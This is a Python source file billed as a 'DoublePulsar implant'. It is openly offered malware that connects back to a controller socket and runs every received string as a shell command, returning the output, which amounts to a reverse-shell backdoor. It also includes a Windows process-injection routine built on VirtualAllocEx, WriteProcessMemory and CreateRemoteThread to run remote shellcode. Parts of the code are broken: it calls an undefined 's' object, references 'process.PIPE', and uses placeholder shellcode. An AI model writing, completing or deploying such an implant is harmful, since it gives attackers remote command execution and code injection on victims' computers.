## DoublePulsar Implant for Windows 7+
## Version 0.5
## By ShowNadda
# Information:
# Injects shellcode into processes
# (todo) Injects Dll's into running processes
##

## Global Imports
import socket
import subprocess
from subprocess import *
import ctypes
from ctypes import *
import os
from os import *

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
client_ip = "127.0.0.1"
client_port = 8888

## Commented out for now because developer is stupid and uses powerpoint to show code
# Will fix later with actually good code.
#def download(file_path):
#    x = file_path
#        if os.path.isfile(x) ==
#while true:
#        with open(x,'rb') as f:
#            data = f.read()
#            f.close
#        return data
#    else:
#        return "Error"

def inject_shellcode():
    PID = 4096
    shellcode = s.recv(8192)
    try:
        shell = "Insert shellcode here!!!"
        page_rwx_value = 0x40                    ## Section of memory to store our shellcode with /r/w/x/ permissions
        process_all = 0x1F0FFF                   ## Get all rights of the injected process
        memcommit = 0x00001000                   ## Allocates memory and makes sure the buffer is clear
        kernel32_variable = windll.kernel32      ## Stores the available calls from kernel32.dll
        process_id = int(PID)                    ## ID of the injected Process
        shellcode_length = len(shell)            ## Total length of the Shellcode payload
        process_handle = kernel32_variable.OpenProcess(process_all, False, process_id)
        memory_allocation_variable = kernel32_variable.VirtualAllocEx(process_handle,0,shellcode_length,memcommit,page_rwx_value)
        kernel32_variable.WriteProcessMemory(process_handle, memory_allocation_variable, shell, shellcode_length,0)
        kernel32_variable.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0)
    except Exception as e:
        print(str(e))

client.connect((client_ip,client_port))
client.send("[!] Client has Successfully connected!"+"\n")

while 1:

    data = s.recv(1024).decode()
    if not data:
        break

    elif "sc" in data:
        inject_shellcode()
    else:
        print(data)
        proc = subprocess.Popen(data, shell=True, stdout=process.PIPE, stderr=subprocess.PIPE)
        result = proc.stdout.read() + proc.stderr.read()
        client.send(result)
